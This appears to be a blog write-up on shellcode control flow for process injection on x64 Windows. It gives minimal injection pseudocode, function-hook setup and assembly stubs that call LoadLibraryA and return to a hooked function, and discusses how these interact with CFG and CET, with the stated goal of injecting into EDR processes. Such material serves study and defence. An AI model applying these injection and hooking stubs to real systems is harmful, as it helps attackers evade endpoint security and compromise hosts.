# The Injected Shellcode Code-Flow Dilemmas

> *This is a short write-up on a shellcode flow dilemma, when your shellcode loader stub has to call something like `LoadLibraryA` and cleanly return to "normal" code.*

How I got here? See **Appendix**. This is my attempt to summarise my findings.

# Jump, Enter, Exit

A process has different methonds to control the flow of execution.
In "normal" land the compiler handles stack, registers, cleanup, etc.
In injected shellcode land, the malware writer has to handle each aspect correclty.
Below is a short overview of the 3 possibilities to control the code flow:

* `call` takes execution somewhere and pushes the return address (right after the call address) on the stack, so the called location can just `ret` to this previous location, given the ret address is at the current `rsp` position
* `jmp` takes you in and out of code without touching the stack, but you have to remember all return addresses and return there "manually"
* `push X`-`ret` is a hand-rolled "call" that lands on `X` and allows the called location to again `ret` to the shellcode. Notice the twp `ret` yet no `call`? In the bizz this is called foreshadowing.

An overview what happens to the stack:

| Method | Stack |
|--------|-------|
| call   | rsp-8, and pushes addr after call to rsp |
| jmp    | nothing |
| push X ret | rsp-8, pushes X to rsp, then pops X into rip (rsp+8 again)

Also, a quick mandatory overview of mitigations

| Mitigation | How? | Against what? |
|------------|------|---------------|
| CFG        | right before a call/jmp a check is inserted to only call registered sites | e.g. `call rax` when the attacker can **only control rax** but not the instructions |
| CET        | each call pushes the ret addr to a shadow stack, can only ret to these addrs a call | when the attacker wants to chain ROP gadgets |
| IBT        | hardware alternative to CFG | <s>idk, Linux attacks something something</s> |
| XFG        | CFG + legit function signature | deprecated, lol |

# The Dilemmas appear

> *This chapter shows the above code flow methods in minimal examples and describes the struggles with each of those.*

## Call me <s>Maybe</s> Shellcode

Assuming you inject shellcode into a remote process and want to call it, a simple example would be:

```c++
// myProc, minimal
lpAddr = AllocMemory(hRemote);
WriteProcessMemory(shellcode, lpAddr);
CreateRemoteThread(hRemote, lpAddr);
```

```asm
; remote process
nop
nop
;...
xor rax, rax
ret
```

MyProc simply writes the shellcode to the remote process and executes it. The shellcode `nop`s and eventually returns, 0 in `rax` indicating success.

## Acutally useful Shellcode

When the shellcode then wants to call functions (e.g. `LoadLibraryA`), it usually looks like this:

```asm
; cut stuff before (prologue)

sub rsp, 28h              ; each function requires shadow space (20h) + maybe 16byte alignment (+8h or +0h)
movabs rax, LoadLibraryA
movabs rcx, dllPath

call rax                  ; actual call to LoadLibraryA, will ret to line below
add rsp, 28h              ; rebalance the stack (delete shadow space again)

; cut stuff after (epilogue)
```

Notice that the shellcode regains control after the `LoadLibraryA` call, to rebalance the stack after it.
Not rebalancing the stack means all future `ret`s receive a wrong address (28h too high) and the thread and maybe process crashes.

## Advanced Executors

Not everyone can afford a clean `CreateRemoteThread` or `QueueUserAPC2`, see [InjectLoader](https://github.com/evilele/EDR-Introspection/tree/master/InjectLoader) btw.
The stuff before and after in the above example must handle the quirks of the executor.
These fancy executors may be [ThreadlessInject](https://github.com/CCob/ThreadlessInject) (function hooking but for execution) or
[ThreadHijacking](https://github.com/guidedhacking/GuidedHacking-Injector/blob/master/GH%20Injector%20Library/Thread%20Hijacking.cpp).
A simple example of function hooking is below, together with its setup and cleanup:

### Function Hooking

```c++
// myHooker, minimal
lpHookAddr = GetProcAddr("OpenFile");
```

```asm
; jmpToShellcode
movabs rax, shellcodeAddr
call rax
; this call is not mitigated by CFG as we control the instructions and do NOT insert a CFG check manually ;)
```

```c++
// overwrite the start of "OpenFile" to jmp to the shellcode
WriteProcessMemory(lpHookAddr, jmpToShellcode);
```

### Shellcode Setup and Cleanup

The shellcode at `shellcodeAddr` gains execution when `OpenFile` is executed the next time.
When the shellcode finishes it has to cleanly return to the start of `OpenFile`, getting this address is the first step:

```asm
; when using call, the addr at rsp points to the instruction right after the call
pop rbx        ; get ret addr
sub rbx, 0x0C  ; size of movabs and call instructions
```

After this setup the shellcode has to restore the original bytes of `OpenFile` (exercise of the reader), do its malicious stuff and go back to `OpenFile`.
Any called function like `LoadLibraryA` should not touch the `rbx` reg, meaning the above example with calling LoadLib could be inserted here and we could still do:

```asm
jmp rbx        ; to jump back to OpenFile
```

Alternatively, we could push the return addr to the top of the stack, and keeping the stack balanced would allow to simply `ret`:

```
; in setup, after pop rbx and sub rbx, 0x0C
push rbx       ; OpenFile on top of stack

; do malicious stuff with balanced stack

ret            ; the return addr should still be on top of the stack
```

The stack should be balanced anyhow as mentioned above, unless this thread *can* crash and burn.

## The Problems arise

The `ret` above however would return to the top of the `OpenFile` function, **not** at `OpenFile+0x0C`, meaning CET would see the mismatch and kill the process.
However^2, if `OpenFile` would be a legit target to return to (i.e. there is a call instruction right before the `OpenFile` function bytes, and this call was triggered some time before) CET would be okay with this ultra-special case.*
<br><br>
Also, remember the `call rax` from function hooking? If you do not "clear" this `call` with a `ret`, the next `ret` will just fail, i.e. the legit `ret` in `OpenFile`.
To recall `CET` expects calls and returns to be "balanced", but the `call shellcode` was not balanced out with a `ret` to right after the shellcode.

## How to solve it?

> *2 jmps are as strong as a call and ret combined* 
<br>
> - Sun Tsu, probably

# TODO from here


```asm
; restore the hooked function
movabs rbx, hookedFunc    ; where the hooked (original) function continues after the detour
movabs rax, originalBytes ; the original bytes before the function was hooked
mov qword ptr [rbx], rax  ; write original bytes

; setup LoadLibrary(dllPath) and return to hooked function
push rbx                  ; fabricated return address
movabs rax, LoadLibraryA
movabs rcx, dllPath       ; Win64: first argument goes in rcx
push rax
ret                       ; "call" LoadLib, then return to hookedFunc
```

The trick: `ret` doesn't return anywhere, it just eats the top of the stack into RIP. The stack choreography of this (S = `rsp` at stub entry):

```text
push rbx    ->  [S-0x8]  = hookedFunc
push rax    ->  [S-0x10] = LoadLibraryA
ret         ->  RIP = LoadLibraryA, rsp = S-0x8 (hookedFunc now on top)
LoadLib ret ->  RIP = hookedFunc,   rsp = S     <- balanced, like nothing happened
```

Fire-and-forget: check. Balanced: check. Shadow space: **dead**. 
The geometry is unforgiving: for LoadLib's final `ret` to restore `rsp`, its entry `rsp` is forced to `S-0x8`, so its 32 home bytes would have to live at `[S, S+0x28)` which is not free scratch, but the live frame of the hooked function (its own return-address slot and its caller's home area). 
Any callee that homes its arguments smashes that, and the process dies at the next `ret`. So out of **{fire-and-forget, ABI-correct shadow space, balanced return} you can only pick two**, and the minimal stub picks fire-and-forget + balance, skips shadow space entirely, and bets that `LdrLoadDll` never homes its args on current builds. 
It usually wins that bet. *Usually.*

# CFG, CET and jmp

- **CFG** only validates indirect `call`/`jmp` targets inside guarded modules, so the stub's own `call rax` never triggers it anyway. It only starts to matter when *entry* is a hijacked function pointer in guarded code, which is exactly where a `push X; ret` gadget inside a CFG-valid module lets you slip past the bitmap check.
- **CET** is the hardware revenge: every `call` pushes onto a parallel shadow stack and every `ret` is validated against it, so fire-and-forget `push X; ret` mismatches and fast-fails the process. This is increasingly the default on Win11 24H2 x64.
- **jmp?** "jmp out" is simultaneously ABI-correct and CET-proof ("IBT, what's that?" - Windows 2026). However, the target must arrive with a balanced stack and the right resume address already baked into a register, which is why the stable stub keeps control instead of going fire-and-forget.

In short: CFG guards compiler-emitted indirect branches (calls and jumps), not returns. CET guards returns (and with IBT, indirect branch targets); your shellcode sits outside both, until SHSTK sees a mismatched ret.

# Your Proc my Proc

| Transfer                                     | exec from shellcode | Executed from CFG binary              | CET SHSTK                                     |
| -----------------------------------------------------------------------------------------------------------------------------------------------------------|
| direct call/jmp rel32                        | no check            | no check (static target)              | call/ret pairs consistent; jmp not tracked    |
| indirect call rax (implied ret)              | no check            | checked and **kills** if unregistered | ret consistent as the call pushes to shadow   |
| indirect jmp rax                             | no check            | checked and **kills** if unregistered | not tracked                                   |
| hooked function (like threadless inject)     | no, hooked code     | is hooked, so not registered          | call-hook is consistent, jmp-hhok not tracked |
| ret to fabricated address                    | no check            | CFG does not validate rets            | checked and **kills** if not consistent       |

# Conclusion

> *Pick your two, mind your `rsp` balance, write shitty shellcode and break ABIs.*

# Appendix

This <del>nighmare into</del> shellcode writing started 6 months ago with Sektor7's proposal 
> "Why do you need kernel callbacks disabled, when you could already get a process handle?"

Being naive enough, I tried it instead of counting a win as a win (I already achieved DLL loading in protected procs):

- Firstly, I expanded KDU to also give process and thread handles.
- I noticed I still cannot use `CreateRemoteThread` in EDR procs.
- Thread Hijacking and `QueueUserAPC2` was added to my inject loader, giving me a first taste of how to **inject shellcode**.
- Finally, [ThreadlessInject](https://github.com/CCob/ThreadlessInject) challenged my puny understanding of injected shellcode even more.

